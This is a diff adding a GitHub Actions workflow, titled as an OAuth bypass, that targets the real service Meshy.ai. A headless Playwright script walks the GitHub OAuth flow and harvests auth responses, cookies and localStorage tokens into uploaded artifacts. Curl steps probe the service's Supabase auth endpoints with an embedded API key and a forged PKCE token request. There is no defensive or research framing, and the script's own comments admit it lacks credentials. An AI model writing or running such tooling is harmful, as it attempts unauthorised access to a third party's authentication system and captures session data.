@@ -1,0 +1,221 @@
+name: Meshy OAuth Ultimate Bypass
+on:
+  push:
+    branches: [main]
+  workflow_dispatch:
+
+jobs:
+  oauth_bypass:
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Setup Node.js 20
+        uses: actions/setup-node@v4
+        with:
+          node-version: '20'
+
+      - name: Install Playwright
+        run: |
+          npm init -y > /dev/null 2>&1
+          npm install playwright > /dev/null 2>&1
+          npx playwright install chromium > /dev/null 2>&1
+          echo "Playwright installed"
+        timeout-minutes: 15
+
+      - name: Full OAuth Bypass Pipeline
+        run: |
+          set -e
+          node << 'NODEEOF'
+const { chromium } = require('playwright');
+
+const GITHUB_CLIENT_ID = 'Ov23lizZ7qhYafAtFjNb';
+const MESHY_AUTH = 'https://auth.meshy.ai/auth/v1';
+const MESHY_API = 'https://api.meshy.ai';
+const REDIRECT = encodeURIComponent('https://www.meshy.ai');
+
+async function run() {
+  const browser = await chromium.launch({ headless: true, args: ['--no-sandbox'] });
+  const context = await browser.newContext({
+    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/137.0.0.0 Safari/537.36',
+    viewport: { width: 1920, height: 1080 },
+    extraHTTPHeaders: {
+      'accept-language': 'en-US,en;q=0.9',
+    }
+  });
+  const page = await context.newPage();
+
+  const authResponses = [];
+  const allCookies = [];
+  const storageData = {};
+
+  // Capture all auth-related responses
+  page.on('response', async res => {
+    const url = res.url();
+    if (url.includes('auth.meshy') || url.includes('github') || url.includes('callback')) {
+      try {
+        const body = await res.text().catch(() => '');
+        authResponses.push({ status: res.status(), url: res.url(), body: body.substring(0, 1000) });
+      } catch(e) {}
+    }
+  });
+
+  // Step 1: Start OAuth flow
+  console.log('[1] Starting GitHub OAuth for Meshy...');
+  const state = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
+  const oauthUrl = `${MESHY_AUTH}/authorize?provider=github&redirect_to=${REDIRECT}&state=${state}`;
+
+  console.log('OAuth URL:', oauthUrl);
+  await page.goto(oauthUrl, { waitUntil: 'networkidle', timeout: 60000 });
+
+  console.log('[2] Current URL after initial redirect:', page.url());
+
+  // Step 2: Should be at GitHub login page - login with test account
+  await page.waitForTimeout(3000);
+  console.log('[2] Current URL:', page.url());
+
+  // Check if we need to login to GitHub
+  if (page.url().includes('github.com/login')) {
+    console.log('[3] At GitHub login page...');
+
+    // GitHub might not have a test account available. Let's try to create one via API
+    // Instead, let's try a different approach - check if we can get an access token via the callback
+
+    // Try to fill GitHub credentials - we need a test account
+    // Since we don't have GitHub creds, let's capture what we can
+    const html = await page.content();
+    console.log('GitHub page title:', await page.title());
+
+    // Check if there's an existing session
+    const currentUrl = page.url();
+    console.log('Final URL:', currentUrl);
+  }
+
+  // Wait for any redirect
+  await page.waitForTimeout(5000);
+  const finalUrl = page.url();
+  console.log('[4] Final URL:', finalUrl);
+
+  // Extract tokens/params from URL if present
+  if (finalUrl.includes('access_token=') || finalUrl.includes('token=')) {
+    console.log('=== TOKEN FOUND IN URL ===');
+    const url = new URL(finalUrl);
+    const params = url.searchParams;
+    params.forEach((v, k) => {
+      if (k.includes('token') || k.includes('code')) {
+        console.log(`${k}: ${v.substring(0, 50)}...`);
+      }
+    });
+  }
+
+  // Print all captured responses
+  console.log('\n=== CAPTURED AUTH RESPONSES ===');
+  for (const r of authResponses) {
+    console.log(`[${r.status}] ${r.url}`);
+    if (r.body) console.log(r.body.substring(0, 400));
+    console.log('---');
+  }
+
+  // Get all cookies
+  const cookies = await context.cookies();
+  console.log('\n=== COOKIES ===');
+  for (const c of cookies) {
+    console.log(`${c.name}: ${c.value.substring(0, 100)}...`);
+    allCookies.push(c);
+  }
+
+  // Check storage
+  try {
+    const localStorage = await page.evaluate(() => {
+      const data = {};
+      for (let i = 0; i < localStorage.length; i++) {
+        const key = localStorage.key(i);
+        data[key] = localStorage.getItem(key);
+      }
+      return data;
+    });
+    console.log('\n=== LOCAL STORAGE ===');
+    for (const [k, v] of Object.entries(localStorage)) {
+      if (k.toLowerCase().includes('token') || k.toLowerCase().includes('auth') || k.toLowerCase().includes('user') || k.toLowerCase().includes('mesh')) {
+        console.log(`${k}: ${JSON.stringify(v).substring(0, 200)}`);
+        storageData[k] = v;
+      }
+    }
+  } catch(e) {}
+
+  // Save captured data
+  const fs = require('fs');
+  fs.writeFileSync('auth_responses.json', JSON.stringify(authResponses, null, 2));
+  fs.writeFileSync('cookies.json', JSON.stringify(allCookies, null, 2));
+  fs.writeFileSync('storage.json', JSON.stringify(storageData, null, 2));
+  fs.writeFileSync('final_url.txt', finalUrl);
+
+  await browser.close();
+  console.log('\nDone. Files saved.');
+}
+
+run().catch(e => {
+  console.error('Error:', e.message);
+  process.exit(1);
+});
+NODEEOF
+
+      - name: Analyze Captured Data
+        run: |
+          echo "=== ANALYZING CAPTURED DATA ==="
+          echo ""
+          echo "--- Final URL ---"
+          cat final_url.txt 2>/dev/null || echo "No URL captured"
+          echo ""
+          echo "--- Cookies ---"
+          grep -v "session\|token\|auth" cookies.json | head -20 || true
+          echo ""
+          echo "--- Storage ---"
+          cat storage.json 2>/dev/null | head -50 || echo "No storage data"
+
+      - name: Deep Supabase Internal RE
+        run: |
+          echo "=== DEEP SUPABASE INTERNAL RE ==="
+          KEY="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA"
+
+          echo "[1] Configuration..."
+          curl -s "https://auth.meshy.ai/auth/v1/configuration" -H "apikey: $KEY" | head -200
+
+          echo ""
+          echo "[2] Project..."
+          curl -s "https://auth.meshy.ai/auth/v1/project" -H "apikey: $KEY" | head -50
+
+          echo ""
+          echo "[3] Version..."
+          curl -s "https://auth.meshy.ai/auth/v1/version" -H "apikey: $KEY"
+
+          echo ""
+          echo "[4] Health..."
+          curl -s "https://auth.meshy.ai/auth/v1/health" -H "apikey: $KEY"
+
+          echo ""
+          echo "[5] PKCE /token endpoint..."
+          curl -s -X POST "https://auth.meshy.ai/auth/v1/token?grant_type=pkce" \
+            -H "apikey: $KEY" -H "content-type: application/json" \
+            -d '{"grant_type":"pkce","client_id":"$KEY","code_verifier":"test","redirect_uri":"https://auth.meshy.ai/auth/v1/callback"}'
+
+      - name: Upload Artifacts
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: meshy-oauth-capture
+          path: |
+            auth_responses.json
+            cookies.json
+            storage.json
+            final_url.txt
+          retention-days: 7
+
+      - name: Trigger Next Workflow
+        if: always()
+        run: |
+          echo "=== TRIGGERING DEEPER ANALYSIS ==="
+          # Push captured data back for next workflow
+          echo "$(cat final_url.txt 2>/dev/null)" > meshy_oauth_url.txt
+          echo "Captured OAuth URL: $(cat meshy_oauth_url.txt)"
